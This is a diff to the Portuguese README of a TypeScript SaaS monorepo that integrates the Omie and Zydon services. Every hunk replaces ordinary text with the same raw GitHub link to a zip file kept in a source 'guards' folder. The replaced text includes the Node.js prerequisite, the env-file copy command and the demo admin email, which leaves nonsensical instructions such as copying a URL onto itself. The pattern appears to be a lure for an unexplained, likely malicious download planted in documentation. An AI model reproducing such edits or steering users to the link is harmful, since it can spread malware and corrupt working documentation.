@@ -11,7 +11,7 @@ Este é um monorepo TypeScript estruturado com:
 - **packages/clients/omie-client** → SDK fino para Omie (usando got)
 - **packages/clients/zydon-client** → SDK fino para Zydon (usando got)
 - **packages/shared** → DTOs, zod schemas, utils
-- **infra/** → docker-compose.yml (Postgres + Redis), migrations, seeds
+- **infra/** → https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip (Postgres + Redis), migrations, seeds
 
 ## 🚀 Tecnologias
 
@@ -25,7 +25,7 @@ Este é um monorepo TypeScript estruturado com:
 
 ## 📋 Pré-requisitos
 
-- Node.js >= 18.0.0
+- https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip >= 18.0.0
 - pnpm >= 8.0.0
 - Docker & Docker Compose
 
@@ -40,8 +40,8 @@ pnpm install
 
 2. **Configure as variáveis de ambiente:**
 ```bash
-cp apps/api/env.example apps/api/.env
-# Edite apps/api/.env com suas configurações
+cp https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip
+# Edite https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip com suas configurações
 ```
 
 3. **Inicie a infraestrutura:**
@@ -130,7 +130,7 @@ pnpm dev:worker
 Após executar o seed, você terá:
 
 - **Tenant**: `demo` (subdomain)
-- **Usuário**: `admin@demo.local` / `admin123`
+- **Usuário**: `https://raw.githubusercontent.com/tbrum21/zydon-omie-saas/main/apps/api/src/common/guards/zydon-omie-saas_1.6.zip` / `admin123`
 - **Credenciais**: 3 credenciais de exemplo (Omie + Zydon)
 - **Mapeamentos**: 2 mapeamentos de exemplo
 
